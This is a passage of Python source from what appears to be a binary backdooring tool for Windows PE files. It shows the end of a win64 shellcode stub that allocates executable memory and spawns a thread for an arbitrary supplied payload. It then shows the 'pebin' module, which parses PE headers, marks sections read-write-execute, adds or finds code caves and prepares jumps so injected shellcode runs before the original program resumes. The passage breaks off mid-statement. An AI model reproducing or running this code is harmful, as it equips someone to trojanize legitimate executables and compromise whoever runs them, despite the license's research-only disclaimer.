                            "\x75\xf1"                          #jne loop_funcname ; If we have not reached the null terminator, continue
                            "\x4c\x03\x4c\x24\x08"              #add r9, [rsp+8] ; Add the current module hash to the function hash
                            "\x45\x39\xd1"                      #cmp r9d, r10d ; Compare the hash to the one we are searchnig for
                            "\x75\xd8"                          #jnz get_next_func ; Go compute the next function hash if we have not found it
                                                                #; If found, fix up stack, call the function and then value else compute the next one...
                            "\x58"                              #pop rax ; Restore the current modules EAT
                            "\x44\x8b\x40\x24"                  #mov r8d, dword [rax+36] ; Get the ordinal table rva
                            "\x49\x01\xd0"                      #add r8, rdx ; Add the modules base address
                            "\x66\x41\x8b\x0c\x48"              #mov cx, [r8+2*rcx] ; Get the desired functions ordinal
                            "\x44\x8b\x40\x1c"                  #mov r8d, dword [rax+28] ; Get the function addresses table rva
                            "\x49\x01\xd0"                      #add r8, rdx ; Add the modules base address
                            "\x41\x8b\x04\x88"                  #mov eax, dword [r8+4*rcx]; Get the desired functions RVA
                            "\x48\x01\xd0"                      #add rax, rdx ; Add the modules base address to get the functions actual VA
                                                                #; We now fix up the stack and perform the call to the drsired function...
                            #finish:
                            "\x41\x58"                          #pop r8 ; Clear off the current modules hash
                            "\x41\x58"                          #pop r8 ; Clear off the current position in the module list
                            "\x5E"                              #pop rsi ; Restore RSI
                            "\x59"                              #pop rcx ; Restore the 1st parameter
                            "\x5A"                              #pop rdx ; Restore the 2nd parameter
                            "\x41\x58"                          #pop r8 ; Restore the 3rd parameter
                            "\x41\x59"                          #pop r9 ; Restore the 4th parameter
                            "\x41\x5A"                          #pop r10 ; pop off the return address
                            "\x48\x83\xEC\x20"                  #sub rsp, 32 ; reserve space for the four register params (4 * sizeof(QWORD) = 32)
                                                                # ; It is the callers responsibility to restore RSP if need be (or alloc more space or align RSP).
                            "\x41\x52"                          #push r10 ; push back the return address
                            "\xFF\xE0"                          #jmp rax ; Jump into the required function
                                                                #; We now automagically return to the correct caller...
                            #get_next_mod: ;
                            "\x58"                              #pop rax ; Pop off the current (now the previous) modules EAT
                            #get_next_mod1: ;
                            "\x41\x59"                          #pop r9 ; Pop off the current (now the previous) modules hash
                            "\x5A"                              #pop rdx ; Restore our position in the module list
                            "\x48\x8B\x12"                      #mov rdx, [rdx] ; Get the next module
                            "\xe9\x57\xff\xff\xff"              #jmp next_mod ; Process this module
                            )

        self.shellcode1 += (#allocate
                            "\x5d"                              #pop rbp
                            "\x49\xc7\xc6"                      #mov r14, 1abh size of payload...   
                            )
        self.shellcode1 += struct.pack("<H", len(self.supplied_shellcode))
        self.shellcode1 += ("\x00\x00"
                            "\x6a\x40"                          #push 40h
                            "\x41\x59"                          #pop r9 now 40h
                            "\x68\x00\x10\x00\x00"              #push 1000h
                            "\x41\x58"                          #pop r8.. now 1000h
                            "\x4C\x89\xF2"                      #mov rdx, r14
                            "\x6A\x00"                          # push 0
                            "\x59"                              # pop rcx
                            "\x68\x58\xa4\x53\xe5"              #push E553a458
                            "\x41\x5A"                          #pop r10
                            "\xff\xd5"                          #call rbp
                            "\x48\x89\xc3"                      #mov rbx, rax      ; Store allocated address in ebx
                            "\x48\x89\xc7"                      #mov rdi, rax      ; Prepare EDI with the new address
                            )
                            ##mov rcx, 0x1ab
        self.shellcode1 += "\x48\xc7\xc1"
        self.shellcode1 += struct.pack("<H", len(self.supplied_shellcode))
        self.shellcode1 += "\x00\x00"
                            
        #call the get_payload right before the payload
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x43" 

                            # got_payload:
        self.shellcode1 += ( "\x5e"                                 #pop rsi            ; Prepare ESI with the source to copy               
                            "\xf2\xa4"                              #rep movsb          ; Copy the payload to RWX memory
                            "\xe8\x00\x00\x00\x00"                  #call set_handler   ; Configure error handling

                            #set_handler:
                            "\x48\x31\xC0" #  xor rax,rax
                            
                            "\x50"                                  #  push rax          ; LPDWORD lpThreadId (NULL)
                            "\x50"                                  #  push rax          ; DWORD dwCreationFlags (0)
                            "\x49\x89\xC1"                          # mov r9, rax        ; LPVOID lpParameter (NULL)
                            "\x48\x89\xC2"                          #mov rdx, rax        ; LPTHREAD_START_ROUTINE lpStartAddress (payload)
                            "\x49\x89\xD8"                          #mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
                            "\x48\x89\xC1"                          #mov rcx, rax        ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)
                            "\x49\xC7\xC2\x38\x68\x0D\x16"          #mov r10, 0x160D6838  ; hash( "kernel32.dll", "CreateThread" )
                            "\xFF\xD5"                              #  call rbp               ; Spawn payload thread
                            "\x48\x83\xC4\x58"                      #add rsp, 50
                            
                            #stackrestore
                            "\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            "\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"
                            )
        
        
        breakupvar = eat_code_caves(flItms, 0, 2)
        
        #Jump to the win64 return to normal execution code segment.
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip('L')), 16))

        breakupvar = eat_code_caves(flItms, 0, 1)
        
        #get_payload:  #Jump back with the address for the payload on the stack.
        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                   len(self.shellcode2) + 272).rstrip('L')), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                   breakupvar + 272).rstrip('L')), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 244).rstrip('L')), 16))
        else:
            self.shellcode2 = "\xE8\xB8\xFF\xFF\xFF"
        
        #Can inject any shellcode below.

        self.shellcode2 += self.supplied_shellcode
        self.shellcode1 += "\xe9"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)


##########################################################
#                 END win64 shellcodes                   #
##########################################################
########NEW FILE########
__FILENAME__ = pebin
'''
    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
    
    Copyright (C) 2013,2014, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.
'''

import sys
import os
import struct
import shutil
import random
import signal
import platform
import stat
import time
import subprocess
from random import choice
from binascii import unhexlify
from optparse import OptionParser
from intel.intelCore import intelCore
from intel.intelmodules import eat_code_caves
from intel.WinIntelPE32 import winI32_shellcode
from intel.WinIntelPE64 import winI64_shellcode


MachineTypes = {'0x0': 'AnyMachineType',
                '0x1d3': 'Matsushita AM33',
                '0x8664': 'x64',
                '0x1c0': 'ARM LE',
                '0x1c4': 'ARMv7',
                '0xaa64': 'ARMv8 x64',
                '0xebc': 'EFIByteCode',
                '0x14c': 'Intel x86',
                '0x200': 'Intel Itanium',
                '0x9041': 'M32R',
                '0x266': 'MIPS16',
                '0x366': 'MIPS w/FPU',
                '0x466': 'MIPS16 w/FPU',
                '0x1f0': 'PowerPC LE',
                '0x1f1': 'PowerPC w/FP',
                '0x166': 'MIPS LE',
                '0x1a2': 'Hitachi SH3',
                '0x1a3': 'Hitachi SH3 DSP',
                '0x1a6': 'Hitachi SH4',
                '0x1a8': 'Hitachi SH5',
                '0x1c2': 'ARM or Thumb -interworking',
                '0x169': 'MIPS little-endian WCE v2'
                }

#What is supported:
supported_types = ['Intel x86', 'x64']

class pebin():
    
    def __init__(self, FILE, OUTPUT, SHELL, NSECTION='sdata', DISK_OFFSET=0, ADD_SECTION=False,
                CAVE_JUMPING=False, PORT=8888, HOST="127.0.0.1", SUPPLIED_SHELLCODE=None, 
                INJECTOR = False, CHANGE_ACCESS = True, VERBOSE=False, SUPPORT_CHECK=False, 
                SHELL_LEN=300, FIND_CAVES=False, SUFFIX=".old", DELETE_ORIGINAL=False, CAVE_MINER=False,
                IMAGE_TYPE="ALL", ZERO_CERT=True, CHECK_ADMIN=False, PATCH_DLL=True):
        self.FILE = FILE
        self.OUTPUT = OUTPUT;
        self.SHELL = SHELL
        self.NSECTION = NSECTION
        self.DISK_OFFSET = DISK_OFFSET
        self.ADD_SECTION = ADD_SECTION
        self.CAVE_JUMPING = CAVE_JUMPING
        self.PORT = PORT
        self.HOST = HOST
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.INJECTOR = INJECTOR
        self.CHANGE_ACCESS = CHANGE_ACCESS
        self.VERBOSE = VERBOSE
        self.SUPPORT_CHECK = SUPPORT_CHECK
        self.SHELL_LEN = SHELL_LEN
        self.FIND_CAVES = FIND_CAVES
        self.SUFFIX = SUFFIX
        self.DELETE_ORIGINAL = DELETE_ORIGINAL
        self.CAVE_MINER = CAVE_MINER
        self.IMAGE_TYPE = IMAGE_TYPE
        self.ZERO_CERT = ZERO_CERT
        self.CHECK_ADMIN = CHECK_ADMIN
        self.PATCH_DLL = PATCH_DLL
        self.flItms = {}
       

    def run_this(self):
        if self.INJECTOR is True:
            self.injector()
            sys.exit()
        if self.FIND_CAVES is True:
            issupported = self.support_check()
            if issupported is False:
                print self.FILE, "is not supported."
                sys.exit()
            print ("Looking for caves with a size of %s "
               "bytes (measured as an integer)"
               % self.SHELL_LEN)
            self.find_all_caves()
            sys.exit()
        if self.SUPPORT_CHECK is True:
            if not self.FILE:
                print "You must provide a file to see if it is supported (-f)"
                sys.exit()
            try:
                is_supported = self.support_check()
            except Exception, e:
                is_supported = False
                print 'Exception:', str(e), '%s' % self.FILE
            if is_supported is False:
                print "%s is not supported." % self.FILE
            else:
                print "%s is supported." % self.FILE
                
            sys.exit()
        self.output_options()
        return self.patch_pe()


    def gather_file_info_win(self):
        """
        Gathers necessary PE header information to backdoor
        a file and returns a dict of file information called flItms
        """
        #To do:
        #   verify signed vs unsigned
        #   map all headers
        #   map offset once the magic field is determined of 32+/32

        self.binary.seek(int('3C', 16))
        print "[*] Gathering file info"
        self.flItms['filename'] = self.FILE
        self.flItms['buffer'] = 0
        self.flItms['JMPtoCodeAddress'] = 0
        self.flItms['LocOfEntryinCode_Offset'] = self.DISK_OFFSET
        #---!!!! This will need to change for x64 !!!!
        #not so sure now..
        self.flItms['dis_frm_pehdrs_sectble'] = 248
        self.flItms['pe_header_location'] = struct.unpack('<i', self.binary.read(4))[0]
        # Start of COFF
        self.flItms['COFF_Start'] = self.flItms['pe_header_location'] + 4
        self.binary.seek(self.flItms['COFF_Start'])
        self.flItms['MachineType'] = struct.unpack('<H', self.binary.read(2))[0]
        if self.VERBOSE is True:
            for mactype, name in MachineTypes.iteritems():
                if int(mactype, 16) == self.flItms['MachineType']:
                        print 'MachineType is:', name
        #self.binary.seek(self.flItms['BoundImportLocation'])
        #self.flItms['BoundImportLOCinCode'] = struct.unpack('<I', self.binary.read(4))[0]
        self.binary.seek(self.flItms['COFF_Start'] + 2, 0)
        self.flItms['NumberOfSections'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['TimeDateStamp'] = struct.unpack('<I', self.binary.read(4))[0]
        self.binary.seek(self.flItms['COFF_Start'] + 16, 0)
        self.flItms['SizeOfOptionalHeader'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['Characteristics'] = struct.unpack('<H', self.binary.read(2))[0]
        #End of COFF
        self.flItms['OptionalHeader_start'] = self.flItms['COFF_Start'] + 20
        
        #if self.flItms['SizeOfOptionalHeader']:
            #Begin Standard Fields section of Optional Header
        self.binary.seek(self.flItms['OptionalHeader_start'])
        self.flItms['Magic'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['MajorLinkerVersion'] = struct.unpack("!B", self.binary.read(1))[0]
        self.flItms['MinorLinkerVersion'] = struct.unpack("!B", self.binary.read(1))[0]
        self.flItms['SizeOfCode'] = struct.unpack("<I", self.binary.read(4))[0]
        self.flItms['SizeOfInitializedData'] = struct.unpack("<I", self.binary.read(4))[0]
        self.flItms['SizeOfUninitializedData'] = struct.unpack("<I",
                                                          self.binary.read(4))[0]
        self.flItms['AddressOfEntryPoint'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['BaseOfCode'] = struct.unpack('<I', self.binary.read(4))[0]
        #print 'Magic', self.flItms['Magic']
        if self.flItms['Magic'] != int('20B', 16):
            #print 'Not 0x20B!'
            self.flItms['BaseOfData'] = struct.unpack('<I', self.binary.read(4))[0]
        # End Standard Fields section of Optional Header
        # Begin Windows-Specific Fields of Optional Header
        if self.flItms['Magic'] == int('20B', 16):
            #print 'x64!'
            self.flItms['ImageBase'] = struct.unpack('<Q', self.binary.read(8))[0]
        else:
            self.flItms['ImageBase'] = struct.unpack('<I', self.binary.read(4))[0]
        #print 'self.flItms[ImageBase]', hex(self.flItms['ImageBase'])
        self.flItms['SectionAlignment'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['FileAlignment'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['MajorOperatingSystemVersion'] = struct.unpack('<H',
                                                              self.binary.read(2))[0]
        self.flItms['MinorOperatingSystemVersion'] = struct.unpack('<H',
                                                              self.binary.read(2))[0]
        self.flItms['MajorImageVersion'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['MinorImageVersion'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['MajorSubsystemVersion'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['MinorSubsystemVersion'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['Win32VersionValue'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['SizeOfImageLoc'] = self.binary.tell()
        self.flItms['SizeOfImage'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['SizeOfHeaders'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['CheckSum'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['Subsystem'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['DllCharacteristics'] = struct.unpack('<H', self.binary.read(2))[0]
        if self.flItms['Magic'] == int('20B', 16):
            self.flItms['SizeOfStackReserve'] = struct.unpack('<Q', self.binary.read(8))[0]
            self.flItms['SizeOfStackCommit'] = struct.unpack('<Q', self.binary.read(8))[0]
            self.flItms['SizeOfHeapReserve'] = struct.unpack('<Q', self.binary.read(8))[0]
            self.flItms['SizeOfHeapCommit'] = struct.unpack('<Q', self.binary.read(8))[0]

        else:
            self.flItms['SizeOfStackReserve'] = struct.unpack('<I', self.binary.read(4))[0]
            self.flItms['SizeOfStackCommit'] = struct.unpack('<I', self.binary.read(4))[0]
            self.flItms['SizeOfHeapReserve'] = struct.unpack('<I', self.binary.read(4))[0]
            self.flItms['SizeOfHeapCommit'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['LoaderFlags'] = struct.unpack('<I', self.binary.read(4))[0]  # zero
        self.flItms['NumberofRvaAndSizes'] = struct.unpack('<I', self.binary.read(4))[0]
        # End Windows-Specific Fields of Optional Header
        # Begin Data Directories of Optional Header
        self.flItms['ExportTable'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['ImportTableLOCInPEOptHdrs'] = self.binary.tell()
        self.flItms['ImportTable'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['ResourceTable'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['ExceptionTable'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['CertTableLOC'] = self.binary.tell()
        self.flItms['CertificateTable'] = struct.unpack('<Q', self.binary.read(8))[0]
        
        self.flItms['BaseReLocationTable'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['Debug'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['Architecutre'] = struct.unpack('<Q', self.binary.read(8))[0]  # zero
        self.flItms['GlobalPrt'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['TLS Table'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['LoadConfigTable'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['BoundImportLocation'] = self.binary.tell()
        #print 'BoundImportLocation', hex(self.flItms['BoundImportLocation'])
        self.flItms['BoundImport'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.binary.seek(self.flItms['BoundImportLocation'])
        self.flItms['BoundImportLOCinCode'] = struct.unpack('<I', self.binary.read(4))[0]
        #print 'first IATLOCIN CODE', hex(self.flItms['BoundImportLOCinCode'])
        self.flItms['BoundImportSize'] = struct.unpack('<I', self.binary.read(4))[0]
        #print 'BoundImportSize', hex(self.flItms['BoundImportSize'])
        self.flItms['IAT'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['DelayImportDesc'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['CLRRuntimeHeader'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['Reserved'] = struct.unpack('<Q', self.binary.read(8))[0]  # zero
        self.flItms['BeginSections'] = self.binary.tell()

        if self.flItms['NumberOfSections'] is not 0:
        
            self.flItms['Sections'] = []
            for section in range(self.flItms['NumberOfSections']):
                sectionValues = []
                sectionValues.append(self.binary.read(8))
                # VirtualSize
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                # VirtualAddress
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                # SizeOfRawData
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                # PointerToRawData
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                # PointerToRelocations
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                # PointerToLinenumbers
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                # NumberOfRelocations
                sectionValues.append(struct.unpack('<H', self.binary.read(2))[0])
                # NumberOfLinenumbers
                sectionValues.append(struct.unpack('<H', self.binary.read(2))[0])
                # SectionFlags
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                self.flItms['Sections'].append(sectionValues)
                if 'UPX'.lower() in sectionValues[0].lower():
                    print "UPX files not supported."
                    return False
                if ('.text\x00\x00\x00' == sectionValues[0] or
                   'AUTO\x00\x00\x00\x00' == sectionValues[0] or
                   'CODE\x00\x00\x00\x00' == sectionValues[0]):
                    self.flItms['textSectionName'] = sectionValues[0]
                    self.flItms['textVirtualAddress'] = sectionValues[2]
                    self.flItms['textPointerToRawData'] = sectionValues[4]
                elif '.rsrc\x00\x00\x00' == sectionValues[0]:
                    self.flItms['rsrcSectionName'] = sectionValues[0]
                    self.flItms['rsrcVirtualAddress'] = sectionValues[2]
                    self.flItms['rsrcSizeRawData'] = sectionValues[3]
                    self.flItms['rsrcPointerToRawData'] = sectionValues[4]
            self.flItms['VirtualAddress'] = self.flItms['SizeOfImage']
            
            self.flItms['LocOfEntryinCode'] = (self.flItms['AddressOfEntryPoint'] -
                                          self.flItms['textVirtualAddress'] +
                                          self.flItms['textPointerToRawData'] +
                                          self.flItms['LocOfEntryinCode_Offset'])

            
        else:
             self.flItms['LocOfEntryinCode'] = (self.flItms['AddressOfEntryPoint'] -
                                          self.flItms['LocOfEntryinCode_Offset'])

        self.flItms['VrtStrtngPnt'] = (self.flItms['AddressOfEntryPoint'] +
                                      self.flItms['ImageBase'])
        self.binary.seek(self.flItms['BoundImportLOCinCode'])
        self.flItms['ImportTableALL'] = self.binary.read(self.flItms['BoundImportSize'])
        self.flItms['NewIATLoc'] = self.flItms['BoundImportLOCinCode'] + 40
        #return self.flItms

    
    def print_flItms(self, flItms):

        keys = self.flItms.keys()
        keys.sort()
        for item in keys:
            if type(self.flItms[item]) == int:
                print item + ':', hex(self.flItms[item])
            elif item == 'Sections':
                print "-" * 50
                for section in self.flItms['Sections']:
                    print "Section Name", section[0]
                    print "Virutal Size", hex(section[1])
                    print "Virtual Address", hex(section[2])
                    print "SizeOfRawData", hex(section[3])
                    print "PointerToRawData", hex(section[4])
                    print "PointerToRelocations", hex(section[5])
                    print "PointerToLinenumbers", hex(section[6])
                    print "NumberOfRelocations", hex(section[7])
                    print "NumberOfLinenumbers", hex(section[8])
                    print "SectionFlags", hex(section[9])
                    print "-" * 50
            else:
                print item + ':', self.flItms[item]
        print "*" * 50, "END flItms"


    def change_section_flags(self, section):
        """
        Changes the user selected section to RWE for successful execution
        """
        print "[*] Changing Section Flags"
        self.flItms['newSectionFlags'] = int('e00000e0', 16)
        self.binary.seek(self.flItms['BeginSections'], 0)
        for _ in range(self.flItms['NumberOfSections']):
            sec_name = self.binary.read(8)
            if section in sec_name:
                self.binary.seek(28, 1)
                self.binary.write(struct.pack('<I', self.flItms['newSectionFlags']))
                return
            else:
                self.binary.seek(32, 1)


    def create_code_cave(self):
        """
        This function creates a code cave for shellcode to hide,
        takes in the dict from gather_file_info_win function and
        writes to the file and returns flItms
        """
        print "[*] Creating Code Cave"
        self.flItms['NewSectionSize'] = len(self.flItms['shellcode']) + 250  # bytes
        self.flItms['SectionName'] = self.NSECTION  # less than 7 chars
        self.flItms['filesize'] = os.stat(self.flItms['filename']).st_size
        self.flItms['newSectionPointerToRawData'] = self.flItms['filesize']
        self.flItms['VirtualSize'] = int(str(self.flItms['NewSectionSize']), 16)
        self.flItms['SizeOfRawData'] = self.flItms['VirtualSize']
        self.flItms['NewSectionName'] = "." + self.flItms['SectionName']
        self.flItms['newSectionFlags'] = int('e00000e0', 16)
        self.binary.seek(self.flItms['pe_header_location'] + 6, 0)
        self.binary.write(struct.pack('<h', self.flItms['NumberOfSections'] + 1))
        self.binary.seek(self.flItms['SizeOfImageLoc'], 0)
        self.flItms['NewSizeOfImage'] = (self.flItms['VirtualSize'] +
                                    self.flItms['SizeOfImage'])
        self.binary.write(struct.pack('<I', self.flItms['NewSizeOfImage']))
        self.binary.seek(self.flItms['BoundImportLocation'])
        if self.flItms['BoundImportLOCinCode'] != 0:
            self.binary.write(struct.pack('=i', self.flItms['BoundImportLOCinCode'] + 40))
        self.binary.seek(self.flItms['BeginSections'] +
               40 * self.flItms['NumberOfSections'], 0)
        self.binary.write(self.flItms['NewSectionName'] +
                "\x00" * (8 - len(self.flItms['NewSectionName'])))
        self.binary.write(struct.pack('<I', self.flItms['VirtualSize']))
        self.binary.write(struct.pack('<I', self.flItms['SizeOfImage']))
        self.binary.write(struct.pack('<I', self.flItms['SizeOfRawData']))
        self.binary.write(struct.pack('<I', self.flItms['newSectionPointerToRawData']))
        if self.VERBOSE is True:
            print 'New Section PointerToRawData'
            print self.flItms['newSectionPointerToRawData']
        self.binary.write(struct.pack('<I', 0))
        self.binary.write(struct.pack('<I', 0))
        self.binary.write(struct.pack('<I', 0))
        self.binary.write(struct.pack('<I', self.flItms['newSectionFlags']))
        self.binary.write(self.flItms['ImportTableALL'])
        self.binary.seek(self.flItms['filesize'] + 1, 0)  # moving to end of file
        nop = choice(intelCore.nops)
        if nop > 144:
            self.binary.write(struct.pack('!H', nop) * (self.flItms['VirtualSize'] / 2))
        else:
            self.binary.write(struct.pack('!B', nop) * (self.flItms['VirtualSize']))
        self.flItms['CodeCaveVirtualAddress'] = (self.flItms['SizeOfImage'] +
                                            self.flItms['ImageBase'])
        self.flItms['buffer'] = int('200', 16)  # bytes
        self.flItms['JMPtoCodeAddress'] = (self.flItms['CodeCaveVirtualAddress'] -
                                      self.flItms['AddressOfEntryPoint'] -
                                      self.flItms['ImageBase'] - 5 +
                                      self.flItms['buffer'])
        

    def find_all_caves(self ):
        """
        This function finds all the codecaves in a inputed file.
        Prints results to screen
        """

        print "[*] Looking for caves"
        SIZE_CAVE_TO_FIND = self.SHELL_LEN
        BeginCave = 0
        Tracking = 0
        count = 1
        caveTracker = []
        caveSpecs = []
        self.binary = open(self.FILE, 'r+b')
        self.binary.seek(0)
        while True:
            try:
                s = struct.unpack("<b", self.binary.read(1))[0]
            except Exception as e:
                #print str(e)
                break
            if s == 0:
                if count == 1:
                    BeginCave = Tracking
                count += 1
            else:
                if count >= SIZE_CAVE_TO_FIND:
                    caveSpecs.append(BeginCave)
                    caveSpecs.append(Tracking)
                    caveTracker.append(caveSpecs)
                count = 1
                caveSpecs = []

            Tracking += 1

        for caves in caveTracker:

            countOfSections = 0
            for section in self.flItms['Sections']:
                sectionFound = False
                if caves[0] >= section[4] and caves[1] <= (section[3] + section[4]) and \
                    caves[1] - caves[0] >= SIZE_CAVE_TO_FIND:
                    print "We have a winner:", section[0]
                    print '->Begin Cave', hex(caves[0])
                    print '->End of Cave', hex(caves[1])
                    print 'Size of Cave (int)', caves[1] - caves[0]
                    print 'SizeOfRawData', hex(section[3])
                    print 'PointerToRawData', hex(section[4])
                    print 'End of Raw Data:', hex(section[3] + section[4])
                    print '*' * 50
                    sectionFound = True
                    break
            if sectionFound is False:
                try:
                    print "No section"
                    print '->Begin Cave', hex(caves[0])
                    print '->End of Cave', hex(caves[1])
                    print 'Size of Cave (int)', caves[1] - caves[0]
                    print '*' * 50
                except Exception as e:
                    print str(e)
        print "[*] Total of %s caves found" % len(caveTracker)
        self.binary.close()


    def find_cave(self):
        """This function finds all code caves, allowing the user
        to pick the cave for injecting shellcode."""
        
        len_allshells = ()
        if self.flItms['cave_jumping'] is True:
            for item in self.flItms['allshells']:
                len_allshells += (len(item), )
            len_allshells += (len(self.flItms['resumeExe']), )
            SIZE_CAVE_TO_FIND = sorted(len_allshells)[0]
        else:
            SIZE_CAVE_TO_FIND = self.flItms['shellcode_length']
            len_allshells = (self.flItms['shellcode_length'], )

        print "[*] Looking for caves that will fit the minimum "\
              "shellcode length of %s" % SIZE_CAVE_TO_FIND
        print "[*] All caves lengths: ", len_allshells
        Tracking = 0
        count = 1
        #BeginCave=0
        caveTracker = []
        caveSpecs = []

        self.binary.seek(0)

        while True:
            try:
                s = struct.unpack("<b", self.binary.read(1))[0]
            except Exception as e:
                #print "CODE CAVE", str(e)
                break
            if s == 0:
                if count == 1:
                    BeginCave = Tracking
                count += 1
            else:
                if count >= SIZE_CAVE_TO_FIND:
                    caveSpecs.append(BeginCave)
                    caveSpecs.append(Tracking)
                    caveTracker.append(caveSpecs)
                count = 1
                caveSpecs = []

            Tracking += 1

        pickACave = {}

        for i, caves in enumerate(caveTracker):
            i += 1
            countOfSections = 0
            for section in self.flItms['Sections']:
                sectionFound = False
                try:
                    if caves[0] >= section[4] and \
                       caves[1] <= (section[3] + section[4]) and \
                       caves[1] - caves[0] >= SIZE_CAVE_TO_FIND:
                        if self.VERBOSE is True:
                            print "Inserting code in this section:", section[0]
                            print '->Begin Cave', hex(caves[0])
                            print '->End of Cave', hex(caves[1])
                            print 'Size of Cave (int)', caves[1] - caves[0]
                            print 'SizeOfRawData', hex(section[3])
                            print 'PointerToRawData', hex(section[4])
                            print 'End of Raw Data:', hex(section[3] + section[4])
                            print '*' * 50
                        JMPtoCodeAddress = (section[2] + caves[0] - section[4] -
                                            5 - self.flItms['AddressOfEntryPoint'])

                        sectionFound = True
                        pickACave[i] = [section[0], hex(caves[0]), hex(caves[1]),
                                        caves[1] - caves[0], hex(section[4]),
                                        hex(section[3] + section[4]), JMPtoCodeAddress]
                        break
                except:
                    print "-End of File Found.."
                    break
                if sectionFound is False:
                    if self.VERBOSE is True:
                        print "No section"
                        print '->Begin Cave', hex(caves[0])
                        print '->End of Cave', hex(caves[1])
                        print 'Size of Cave (int)', caves[1] - caves[0]
                        print '*' * 50

                JMPtoCodeAddress = (section[2] + caves[0] - section[4] -
                                    5 - self.flItms['AddressOfEntryPoint'])
                try:
                    pickACave[i] = [None, hex(caves[0]), hex(caves[1]),
                                    caves[1] - caves[0], None,
                                    None, JMPtoCodeAddress]
                except:
                    print "EOF"

        print ("############################################################\n"
               "The following caves can be used to inject code and possibly\n"
               "continue execution.\n"
               "**Don't like what you see? Use jump, single, append, or ignore.**\n"
               "############################################################")

        CavesPicked = {}

        for k, item in enumerate(len_allshells):
            print "[*] Cave {0} length as int: {1}".format(k + 1, item)
            print "[*] Available caves: "

            for ref, details in pickACave.iteritems():
                if details[3] >= item:
                    print str(ref) + ".", ("Section Name: {0}; Section Begin: {4} "
                                           "End: {5}; Cave begin: {1} End: {2}; "
